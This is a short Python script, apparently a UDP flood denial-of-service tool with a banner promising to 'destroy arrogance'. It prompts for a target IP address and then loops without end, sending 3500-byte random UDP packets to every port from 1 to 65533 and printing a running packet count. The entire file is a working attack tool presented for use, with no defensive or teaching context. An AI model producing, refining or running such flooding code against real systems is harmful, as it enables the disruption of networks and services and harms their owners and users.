# -*- coding: utf-8 -*-
import os
import socket
import random
import time
import fade

# Colors
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    UNDERLINE = '\033[4m'
    PURPLE = '\033[97m'
    BOLD    = "\033[1m"
    BLACK   = "\033[30m"
    RED     = "\033[31m"
    GREEN   = "\033[32m"
    YELLOW  = "\033[33m"
    BLUE    = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN    = "\033[36m"
    WHITE   = "\033[37m"
    os.system("clear")

########################
white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(3500)
####################

os.system("clear")
logo = """
     ÷÷÷            ÷÷÷                     ÷÷÷
     ÷÷÷            ÷÷÷                     ÷÷÷
     ÷÷÷    ÷÷÷ ÷÷÷ ÷÷÷  ÷÷÷   ÷÷÷     ÷÷÷  ÷÷÷ ÷÷÷ ÷÷÷     
     ÷÷÷  ÷÷÷       ÷÷÷  ÷÷÷ ÷÷   ÷÷÷  ÷÷÷  ÷÷÷       ÷÷÷
     ÷÷÷  ÷÷÷       ÷÷÷  ÷÷÷           ÷÷÷  ÷÷÷        ÷÷÷
     ÷÷÷  ÷÷÷       ÷÷÷  ÷÷÷           ÷÷÷  ÷÷÷       ÷÷÷
     ÷÷÷    ÷÷÷ ÷÷÷ ÷÷÷  ÷÷÷           ÷÷÷  ÷÷÷ ÷÷÷ ÷÷÷
\033[31m                   IDRIB IS A BLOW
\033[32m            WHICH WILL DESTROY ARROGANCE
\033[33m                     Author: KF24
\033[35m                    kode_keras.com
____________________________________________________________
\033[37m____________________________________________________________
"""
ip = input("[+] Target's IP : ")
os.system("clear")
print("Attack starting...")
time.sleep(3)
while True:
    sent = 0
    for port in range(1, 65534):
        white.sendto(bytes, (ip, port))
        sent = sent + 1
        print("\033[37mSend \033[32m%s \033[95m Packets to \033[92m%s \033[36mThrough port \033[33m%s " % (sent, ip, port))

print("\033[1;92mAttack finished\033[0m")
